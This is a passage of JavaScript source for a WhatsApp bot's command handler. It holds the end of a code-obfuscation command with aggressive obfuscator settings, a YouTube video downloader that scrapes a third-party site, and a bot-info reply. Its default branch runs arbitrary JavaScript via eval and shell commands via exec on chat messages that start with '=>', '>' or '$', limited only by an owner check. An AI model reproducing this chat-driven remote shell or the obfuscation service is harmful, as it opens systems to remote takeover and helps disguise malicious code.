duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await trashcore.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Tennormodz`,
}, { quoted: fkontak });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`❌ An error occurred: ${error.message}`);
}
break;
}
//==================================================//   
        case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await trashcore.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await trashcore.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break

        case 'infobot':
case 'botinfo': {
// wait message
trashreply(mess.wait)
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Cases : ${totalfeature()}
│ • Plugins : 30
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
if (!trashown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!trashown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!trashown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await trashcore.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})
